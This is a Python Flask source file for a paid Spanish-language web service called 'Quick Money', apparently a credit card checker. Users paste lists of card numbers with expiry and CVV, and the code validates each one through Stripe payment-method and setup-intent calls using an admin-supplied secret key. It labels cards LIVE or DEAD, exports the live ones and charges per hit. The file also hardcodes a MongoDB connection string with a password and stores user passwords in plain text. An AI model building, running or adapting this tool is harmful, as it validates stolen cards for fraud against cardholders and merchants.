import os, random, time, json, requests
from flask import Flask, render_template_string, request, redirect, session, url_for, jsonify
from pymongo import MongoClient

app = Flask(__name__)
app.secret_key = 'quick_money_v49_nitro'

# --- [ CONFIGURACIÓN MAESTRA ] ---
MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

try:
    client = MongoClient(MONGO_URI)
    db_mongo = client['quickmoney_db']
    usuarios_col = db_mongo['usuarios']
    config_col = db_mongo['config'] # Nueva colección para la SK
except Exception as e:
    print(f"Error MongoDB: {e}")

COSTO_LIVE = 0.15

# --- [ MOTOR PRO: SETUP INTENT ] ---
def check_gate_nitro(cc, sk_key):
    try:
        partes = cc.split('|')
        if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
        num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]

        headers = {"Authorization": f"Bearer {sk_key}", "Content-Type": "application/x-www-form-urlencoded"}
        
        # 1. Crear Payment Method
        pm_data = {"type": "card", "card[number]": num, "card[exp_month]": int(mes), "card[exp_year]": int(ano), "card[cvc]": cvv}
        pm_res = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, timeout=10)
        pm_json = pm_res.json()

        if "error" in pm_json:
            return {"status": "DEAD", "msg": pm_json['error'].get('message', 'DECLINED').upper()}

        # 2. Setup Intent (Validación sin cargo)
        si_data = {"payment_method": pm_json['id'], "confirm": "true", "usage": "off_session"}
        si_res = requests.post('https://api.stripe.com/v1/setup_intents', data=si_data, headers=headers, timeout=10)
        si_json = si_res.json()

        if "error" in si_json:
            return {"status": "DEAD", "msg": si_json['error'].get('decline_code', 'DECLINED').upper()}

        if si_json.get('status') in ['succeeded', 'requires_action', 'processing']:
            return {"status": "LIVE", "msg": "AUTHORIZED"}
        
        return {"status": "DEAD", "msg": "FAILED_AUTH"}
    except:
        return {"status": "DEAD", "msg": "GATE_ERROR"}

# --- [ DISEÑO QUICK MONEY V49 ] ---
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
    :root { --gold: #c5a059; --bg: #000; --card: rgba(10, 10, 12, 0.98); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
    #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; pointer-events: none; opacity: 0.5; }
    .container { max-width: 480px; margin: auto; padding: 20px; position: relative; z-index: 10; }
    .card { background: var(--card); border: 1px solid var(--border); padding: 25px; margin-bottom: 15px; border-radius: 4px; backdrop-filter: blur(10px); }
    .card-h { font-size: 11px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
    input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; }
    .btn { border: none; padding: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
    .btn-gold { background: var(--gold); color: #000; margin-top: 10px; }
    .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; }
    .btn-mini { padding: 6px 10px; width: auto; font-size: 9px; margin: 5px 0; }
    .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; margin-bottom: 10px; }
    a { text-decoration: none; color: var(--gold); font-size: 10px; }
</style>
"""

@app.route('/')
def login():
    if 'user' in session: return redirect(url_for('panel'))
    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2>⚡️🌩️Quick Money🌩️⚡️</h2><span style="color:var(--gold); font-size:10px;">{{CHK}}</span><br><br><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register">¿No tiene cuenta? Regístrese aquí</a></div></div></body></html>')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
        if not usuarios_col.find_one({"u": u}):
            usuarios_col.insert_one({"u": u, "p": p, "saldo": 0.0, "rango": "USER", "telegram": t})
            return redirect(url_for('login'))
    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><div class="container"><div class="card" style="text-align:center;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold">REGISTRARSE</button></form></div></div></body></html>')

@app.route('/panel')
def panel():
    if 'user' not in session: return redirect(url_for('login'))
    u_data = usuarios_col.find_one({"u": session['user']})
    is_admin = session['user'].lower() == "mairo"
    
    # Obtener SK actual de la DB
    current_sk = config_col.find_one({"key": "sk_live"})
    sk_display = current_sk['val'] if current_sk else "NO CONFIGURADA"

    return render_template_string(f"""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
    <body><div class="container">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{"ADMIN" if is_admin else session['user'].upper()}</b></div>
            <div style="border:1px solid var(--gold); padding:8px 15px; color:var(--gold); font-size:11px;">CREDIT: <b id="display_saldo">${u_data['saldo']:.2f}</b></div>
        </div>

        {f'''<div class="card" style="border:1px solid var(--gold)"><span class="card-h">👑 ADMIN NITRO PANEL</span>
            <form action="/update_sk" method="POST">
                <input name="new_sk" placeholder="PEGAR SK_LIVE AQUÍ" value="{sk_display}">
                <button type="submit" class="btn btn-gold btn-mini">ACTUALIZAR LLAVE</button>
            </form>
            <br>
            <form action="/admin_add_saldo" method="POST">
                <input name="target_user" placeholder="USUARIO">
                <input name="amount" type="number" step="0.01" placeholder="CANTIDAD $">
                <button type="submit" class="btn btn-gold">CARGAR SALDO</button>
            </form></div>''' if is_admin else ""}

        <div class="card"><span class="card-h">🪄 GENERADOR / CHECKER</span>
            <input id="bin_val" placeholder="BIN|MM|YYYY" value="47370280484|08|2028">
            <textarea id="check_list" rows="5" placeholder="CC|MM|YY|CVV"></textarea>
            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR CHECK ($0.15)</button>
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center;"><span style="color:var(--green); font-size:10px;">LIVES ✅</span> <button class="btn btn-dark btn-mini" onclick="descargarLives()">📥 DESCARGAR</button></div>
        <div class="res-box" id="lives_log"></div>
        <div style="display:flex; justify-content:space-between; align-items:center;"><span style="color:var(--red); font-size:10px;">DEAD ❌</span></div>
        <div class="res-box" id="dead_log" style="opacity:0.6;"></div>

        <div style="text-align:center; margin-top:20px;">
            <a href="https://t.me/quickmoney_support24" target="_blank">🔵 SOPORTE</a> | 
            <a href="https://t.me/+GUlp9rhO0_k1ZWYx" target="_blank">🔵 GRUPO</a> | 
            <a href="/logout">[ SALIR ]</a>
        </div>
    </div>
    <script>
    async function startChecking() {{
        let a = document.getElementById('check_list'); let lines = a.value.trim().split('\\n');
        if(!lines[0]) return; document.getElementById('btn_start').disabled = true;
        for (let cc of lines) {{
            let r = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc}})}});
            let d = await r.json();
            if(d.status === 'LIVE') {{
                document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
                document.getElementById('lives_log').innerHTML = '<div style="color:var(--green);">'+cc+' | AUTHORIZED</div>' + document.getElementById('lives_log').innerHTML;
            }} else {{
                document.getElementById('dead_log').innerHTML = '<div style="color:#666;">'+cc+' | '+d.msg+'</div>' + document.getElementById('dead_log').innerHTML;
            }}
            await new Promise(r => setTimeout(r, 1000));
        }}
        document.getElementById('btn_start').disabled = false;
    }}
    function descargarLives() {{
        let data = document.getElementById('lives_log').innerText;
        let blob = new Blob([data], {{type: 'text/plain'}});
        let a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'lives.txt'; a.click();
    }}
    </script></body></html>
    """)

@app.route('/update_sk', methods=['POST'])
def update_sk():
    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
    new_sk = request.form.get('new_sk').strip()
    config_col.update_one({"key": "sk_live"}, {"$set": {"val": new_sk}}, upsert=True)
    return redirect(url_for('panel'))

@app.route('/validar_card', methods=['POST'])
def validar():
    u_data = usuarios_col.find_one({"u": session['user']})
    if u_data['saldo'] < COSTO_LIVE: return jsonify({"status":"DEAD", "msg": "SIN SALDO"})
    sk_data = config_col.find_one({"key": "sk_live"})
    if not sk_data: return jsonify({"status":"DEAD", "msg": "SK NO CONFIG"})
    
    cc = request.json.get('card', '')
    res = check_gate_nitro(cc, sk_data['val'])
    
    if res['status'] == 'LIVE':
        new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
        usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
        return jsonify({"status": "LIVE", "nuevo_saldo": new_s})
    return jsonify({"status": "DEAD", "msg": res['msg']})

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('u'), request.form.get('p')
    user_db = usuarios_col.find_one({"u": u, "p": p})
    if user_db: session['user'] = u
    return redirect(url_for('panel'))

@app.route('/admin_add_saldo', methods=['POST'])
def admin_add_saldo():
    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
    usuarios_col.update_one({"u": request.form.get('target_user')}, {"$inc": {"saldo": float(request.form.get('amount'))}})
    return redirect(url_for('panel'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
